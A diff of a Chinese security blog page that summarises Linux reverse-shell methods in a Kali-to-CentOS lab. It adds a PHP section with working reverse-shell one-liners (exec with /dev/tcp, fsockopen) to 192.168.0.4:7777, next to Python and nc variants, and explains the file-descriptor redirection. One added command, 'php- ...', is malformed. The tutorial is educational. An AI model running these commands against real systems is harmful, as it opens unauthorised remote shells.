@@ -113,7 +113,13 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/8ab45ddDa8.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/iliCEIg5cL.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/bCG25adDFg.png?imageslim">
-<meta property="og:updated_time" content="2018-07-18T06:02:50.226Z">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/AfJ3e8GI2i.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/Da1d5I1GgL.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/fmLfgB7mg1.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/JbLmF1b3l9.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/1H1Ie6D8Hg.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/B0c9GjFmD5.png?imageslim">
+<meta property="og:updated_time" content="2018-07-18T07:11:58.595Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux下几种反弹shell方法的总结与理解">
 <meta name="twitter:description" content="Linux下几种反弹shell方法的总结与理解之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法">
@@ -398,7 +404,7 @@
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/H2IlCDa6j2.png?imageslim" alt="mark"><br><strong>在CentOS下使用python去反向连接，输入</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.4',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span></div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/e7kde87mKE.png?imageslim" alt="mark"><br><strong>可以看到kali上成功反弹到了shell，可以执行一些命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/Ek7JD4eGeh.png?imageslim" alt="mark"><br><strong>在已经深入理解了第一种方法的原理后，下面来解释一下python反弹shell的原理</strong></p>
-<p><strong>首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符，值为3</strong></p>
+<p><strong>首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符，经过测试可以看到值为3</strong></p>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/C2adcJcjIh.png?imageslim" alt="mark"></p>
 <p><strong>于是这样就相当于将标准输入(0)、标准输出(1)、标准错误输出(2)重定向到远程(3)，接下来使用os的subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样的话就可以在远程执行输入命令了</strong></p>
 <h3 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h3><p><strong>使用nc反弹shell,需要的条件是被反弹shell的机器安装了nc，CentOS6.5安装nc方法如下</strong></p>
@@ -434,6 +440,16 @@ nc -help成功
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/6Gf87b2g0c.png?imageslim" alt="mark"><br><strong>之后在CentOS上使用nc去反向链接</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777</div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/8ab45ddDa8.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/iliCEIg5cL.png?imageslim" alt="mark"><br><strong>这里通过在kali上监听两个端口，然后在使用CentOS进行反向连接的时候使用到了管道符，管道符的作用是把管道符前的输出作为管道符后的输入，这样的话就可以在远程的6666端口的输入设备（键盘）输入命令，将命令输出传递至本地的<code>/bin/bash</code>，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的7777端口</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/bCG25adDFg.png?imageslim" alt="mark"></p>
+<h3 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a>方法4：</h3><p><strong>使用php反弹shell，方法如下</strong><br><strong>首先最简单的一个办法，就是使用php的exec函数执行方法1反弹shell的命令</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php- <span class="string">'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777")'</span></div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/AfJ3e8GI2i.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/Da1d5I1GgL.png?imageslim" alt="mark"><br><strong>还有一个是之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/fmLfgB7mg1.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/JbLmF1b3l9.png?imageslim" alt="mark"><br><strong>这个姿势看起来有一些难以理解，尤其是还出现了<code>&lt;&amp;</code>这个符号，当然如果把&amp;看着是取地址符或者是引用，那还是可以理解的，为了更方便的理解，我在这将这条命令稍微修改了一下，类似于前面的第二种方法</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
+<p><strong>有了之前的基础，我们知道3代表的是使用fsockopen函数建立socket返回的文件描述符，这里将标准输入，标准输出和标准错误输出都重定向到了远程</strong></p>
+<p><strong>在CentOS上反向连接，输入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("192.168.0.4",7777);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/1H1Ie6D8Hg.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/B0c9GjFmD5.png?imageslim" alt="mark"></p>
 
       
     </div>
@@ -636,7 +652,7 @@ nc -help成功
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux下几种反弹shell方法的总结与理解"><span class="nav-number">1.</span> <span class="nav-text">Linux下几种反弹shell方法的总结与理解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境"><span class="nav-number">1.0.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法1："><span class="nav-number">1.0.2.</span> <span class="nav-text">方法1：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法2："><span class="nav-number">1.0.3.</span> <span class="nav-text">方法2：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法3："><span class="nav-number">1.0.4.</span> <span class="nav-text">方法3：</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux下几种反弹shell方法的总结与理解"><span class="nav-number">1.</span> <span class="nav-text">Linux下几种反弹shell方法的总结与理解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境"><span class="nav-number">1.0.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法1："><span class="nav-number">1.0.2.</span> <span class="nav-text">方法1：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法2："><span class="nav-number">1.0.3.</span> <span class="nav-text">方法2：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法3："><span class="nav-number">1.0.4.</span> <span class="nav-text">方法3：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法4："><span class="nav-number">1.0.5.</span> <span class="nav-text">方法4：</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
